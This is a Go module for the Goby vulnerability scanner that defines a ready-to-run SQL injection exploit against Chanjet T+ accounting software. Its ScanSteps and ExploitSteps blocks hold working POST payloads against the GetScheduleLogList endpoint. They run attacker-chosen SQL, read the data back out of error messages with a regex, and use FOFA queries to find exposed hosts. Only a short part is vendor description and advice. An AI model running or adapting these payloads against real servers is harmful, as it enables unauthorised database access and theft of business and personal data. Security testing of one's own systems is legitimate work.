package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "chanjet-TPlus GetScheduleLogList function scheduleName params SQL Injection Vulnerability",
    "Description": "<p>Chanjet T+ is a new type of Internet enterprise management software developed by Yonyou Software, which fully meets the needs of growing small and micro enterprises for their flexible business process management and control, and focuses on solving management problems such as transaction management, order tracking, funds, and inventory. T+ combines the management experience of more than 1 million small and medium-sized enterprises of Chanjet, adopts the complete B/S structure and .NET advanced development technology, and improves management by solving the key problems of the management status of small and medium-sized enterprises, as well as the control and management of the main links of the business process. level, bringing more management value to the enterprise. Chanjet-TPlus has a SQL injection vulnerability through which attackers can obtain sensitive database information.</p>",
    "Product": "https://www.chanjet.com/",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2022-03-31",
    "Author": "black@blackhat.net",
    "FofaQuery": "body=\"tplus\"",
    "GobyQuery": "body=\"tplus\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The manufacturer has fixed the vulnerability, please contact the manufacturer to get the latest version https://www.chanjet.com/.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "select user,select @@version,select db_name()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"scheduleName\": \"DatabaseConsolidationTask' and 1=(select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32))--\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ce0bfd15059b68d67688884d7a3d3e8c",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"scheduleName\": \"DatabaseConsolidationTask' and 1=({{{sql}}})--\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "re|lastbody|regex|nvarchar 值 '(.*?)' 转换成数据类型",
                "output|lastbody|text|{{{re}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-12845"
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "畅捷通-TPlus GetScheduleLogList 方法 scheduleName 参数 SQL 注入漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p><span style=\"color: rgb(88, 88, 88); font-size: 16px;\">畅捷通</span><span style=\"color: rgb(88, 88, 88); font-size: 16px;\">T+</span><span style=\"color: rgb(88, 88, 88); font-size: 16px;\">是由用友软件开发的一款新型互联网企业管理软件，全面满足成长型小微企业对其灵活业务流程的管控需求，重点解决往来业务管理、订单跟踪、资金、库存等管理难题。</span><span style=\"color: rgb(88, 88, 88); font-size: 16px;\">T+结合畅捷通100多万中小企业的管理经验，采用完全B/S结构及.NET先进开发技术，通过解决中小企业管理现状的重点问题，以及对业务过程主要环节的控制与管理，提升管理水平，为企业带来更多管理价值。畅捷通-TPlus 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。</span><br></p>",
            "Recommendation": "<p>厂商已修复该漏洞，联系厂商获取最新版本<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a>。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "chanjet-TPlus GetScheduleLogList function scheduleName params SQL Injection Vulnerability",
            "Product": "https://www.chanjet.com/",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">Chanjet T+ is a new type of Internet enterprise management software developed by Yonyou Software, which fully meets the needs of growing small and micro enterprises for their flexible business process management and control, and focuses on solving management problems such as transaction management, order tracking, funds, and inventory. T+ combines the management experience of more than 1 million small and medium-sized enterprises of Chanjet, adopts the complete B/S structure and .NET advanced development technology, and improves management by solving the key problems of the management status of small and medium-sized enterprises, as well as the control and management of the main links of the business process. level, bringing more management value to the enterprise. Chanjet-TPlus has a SQL injection vulnerability through which attackers can obtain sensitive database information.</span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">The manufacturer has fixed the vulnerability, please contact the manufacturer to get the latest version <a href=\"https://www.chanjet.com/.\">https://www.chanjet.com/.</a></span><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10932"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}